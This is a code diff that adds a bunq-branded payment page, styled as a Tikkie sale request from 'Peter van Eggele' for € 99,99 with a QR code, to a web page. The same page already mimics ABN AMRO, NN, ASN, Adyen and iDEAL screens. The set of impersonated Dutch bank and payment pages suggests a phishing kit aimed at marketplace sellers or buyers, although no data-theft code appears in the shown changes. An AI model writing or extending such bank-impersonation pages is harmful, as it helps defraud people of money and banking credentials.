@@ -1468,6 +1468,197 @@
       .bank-footer { padding: 14px 16px; flex-direction: column; align-items: flex-start; }
       .last-used .bank-btn { max-width: 100%; }
     }
+
+    /* ========== BUNQ PAGE ========== */
+    #page-bunq {
+      background: #000;
+      color: #fff;
+      align-items: center;
+      padding: 20px 16px 40px;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+    #page-bunq .bunq-logo {
+      font-size: 28px;
+      font-weight: 600;
+      letter-spacing: -0.5px;
+      margin: 12px 0 28px;
+      color: #fff;
+    }
+    #page-bunq .bunq-card {
+      background: #1c1c1e;
+      border-radius: 20px;
+      width: 100%;
+      max-width: 360px;
+      padding: 28px 24px 20px;
+      position: relative;
+      text-align: center;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+    }
+    #page-bunq .bunq-badge {
+      position: absolute;
+      top: -28px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      overflow: hidden;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.35);
+      background: #f5e6c8;
+    }
+    #page-bunq .bunq-badge img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+    #page-bunq .bunq-title {
+      font-size: 17px;
+      font-weight: 600;
+      margin-top: 20px;
+      margin-bottom: 6px;
+      color: #fff;
+    }
+    #page-bunq .bunq-subtitle {
+      font-size: 14px;
+      color: #a1a1a6;
+      margin-bottom: 18px;
+    }
+    #page-bunq .bunq-amount {
+      font-size: 42px;
+      font-weight: 600;
+      color: #ff6b00;
+      margin-bottom: 24px;
+      letter-spacing: -1px;
+    }
+    #page-bunq .bunq-qr-wrapper {
+      background: #fff;
+      border-radius: 12px;
+      padding: 14px;
+      display: inline-block;
+      margin-bottom: 22px;
+    }
+    #page-bunq .bunq-qr-wrapper img {
+      width: 180px;
+      height: 180px;
+      display: block;
+      border-radius: 4px;
+    }
+    #page-bunq .bunq-divider {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 8px 0 18px;
+      color: #636366;
+      font-size: 13px;
+    }
+    #page-bunq .bunq-divider::before,
+    #page-bunq .bunq-divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #3a3a3c;
+    }
+    #page-bunq .bunq-direct-box {
+      background: #2c2c2e;
+      border-radius: 14px;
+      padding: 14px 16px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      text-align: left;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    #page-bunq .bunq-direct-box:hover {
+      background: #3a3a3c;
+    }
+    #page-bunq .bunq-direct-icon {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #00c2ff, #007aff);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      position: relative;
+      overflow: hidden;
+    }
+    #page-bunq .bunq-direct-icon::before {
+      content: "";
+      position: absolute;
+      width: 18px;
+      height: 12px;
+      background: #fff;
+      border-radius: 2px;
+      top: 11px;
+    }
+    #page-bunq .bunq-direct-icon::after {
+      content: "";
+      position: absolute;
+      width: 8px;
+      height: 8px;
+      background: #ff9500;
+      border-radius: 50%;
+      bottom: 8px;
+      right: 8px;
+    }
+    #page-bunq .bunq-direct-text {
+      flex: 1;
+    }
+    #page-bunq .bunq-direct-text strong {
+      display: block;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 2px;
+      color: #fff;
+    }
+    #page-bunq .bunq-direct-text span {
+      font-size: 13px;
+      color: #a1a1a6;
+      line-height: 1.3;
+    }
+    #page-bunq .bunq-chevron {
+      color: #8e8e93;
+      font-size: 18px;
+    }
+    #page-bunq .bunq-bottom-links {
+      margin-top: 22px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 14px;
+    }
+    #page-bunq .bunq-how-it-works {
+      color: #fff;
+      font-size: 14px;
+      text-decoration: underline;
+      text-underline-offset: 3px;
+      cursor: pointer;
+    }
+    #page-bunq .bunq-how-it-works:hover {
+      opacity: 0.8;
+    }
+    #page-bunq .bunq-cancel-btn {
+      background: transparent;
+      border: 1.5px solid #636366;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 500;
+      padding: 10px 32px;
+      border-radius: 24px;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-family: inherit;
+    }
+    #page-bunq .bunq-cancel-btn:hover {
+      background: #2c2c2e;
+      border-color: #8e8e93;
+    }
+    #page-bunq .bunq-cancel-btn:active {
+      transform: scale(0.97);
+    }
   </style>
 </head>
 <body>
@@ -1681,7 +1872,7 @@
           <img src="asn-sns.png" alt="ASN Bank voorheen SNS">
           ASN Bank voorheen SNS
         </button>
-        <button class="bank-btn" type="button">
+        <button class="bank-btn bank-bunq" type="button" id="btn-bunq">
           <img src="bunq.png" alt="bunq">
           bunq
         </button>
@@ -1904,6 +2095,35 @@
     </button>
   </div>
 
+  <!-- ========== BUNQ PAGE ========== -->
+  <div id="page-bunq" class="page">
+    <div class="bunq-logo">bunq</div>
+    <div class="bunq-card" id="paymentCard">
+      <div class="bunq-badge">
+        <img src="bunq-ideal.png" alt="iDEAL / Wero">
+      </div>
+      <div class="bunq-title">Peter van Eggele via Tikkie</div>
+      <div class="bunq-subtitle">Verkoop</div>
+      <div class="bunq-amount">€ 99,99</div>
+      <div class="bunq-qr-wrapper">
+        <img src="qr-bunq.png" alt="QR Code">
+      </div>
+      <div class="bunq-divider">OF</div>
+      <div class="bunq-direct-box">
+        <div class="bunq-direct-icon"></div>
+        <div class="bunq-direct-text">
+          <strong>Doe een directe betaling op dit apparaat</strong>
+          <span>Gebruik bunq Web om in een paar seconden iDEAL betalingen te accepteren.</span>
+        </div>
+        <div class="bunq-chevron">›</div>
+      </div>
+      <div class="bunq-bottom-links">
+        <a href="#" class="bunq-how-it-works">Kijk hoe het werkt</a>
+        <button type="button" class="bunq-cancel-btn" id="btn-annuleer-bunq">Annuleren</button>
+      </div>
+    </div>
+  </div>
+
   <!-- ========== ABN AMRO LOGIN PAGE ========== -->
   <div id="page-abn" class="page">
     <header>
@@ -2054,10 +2274,11 @@
     const pageNn = document.getElementById('page-nn');
     const pageAdyen = document.getElementById('page-adyen');
     const pageAsn = document.getElementById('page-asn');
+    const pageBunq = document.getElementById('page-bunq');
 
     function showPage(page) {
       if (!page) return;
-      [pageTikkie, pageIdeal, pageBank, pageAbn, pageNn, pageAdyen, pageAsn].forEach(p => p.classList.remove('active'));
+      [pageTikkie, pageIdeal, pageBank, pageAbn, pageNn, pageAdyen, pageAsn, pageBunq].forEach(p => p.classList.remove('active'));
       page.classList.add('active');
       window.scrollTo(0, 0);
     }
@@ -2144,7 +2365,19 @@
       window.goToBank();
     });
 
-    document.querySelectorAll('#page-bank .bank-btn:not(.bank-abn):not(.bank-nn):not(.bank-adyen):not(.bank-asn)').forEach(btn => {
+    document.querySelectorAll('.bank-bunq').forEach(btn => {
+      btn.addEventListener('click', () => {
+        showPage(pageBunq);
+        document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000000');
+      });
+    });
+
+    document.getElementById('btn-annuleer-bunq').addEventListener('click', () => {
+      showPage(pageBank);
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', pageBank.classList.contains('dark') ? '#1a1a1a' : '#ffffff');
+    });
+
+    document.querySelectorAll('#page-bank .bank-btn:not(.bank-abn):not(.bank-nn):not(.bank-adyen):not(.bank-asn):not(.bank-bunq)').forEach(btn => {
       btn.addEventListener('click', () => console.log('Geselecteerd:', btn.textContent.trim()));
     });
 
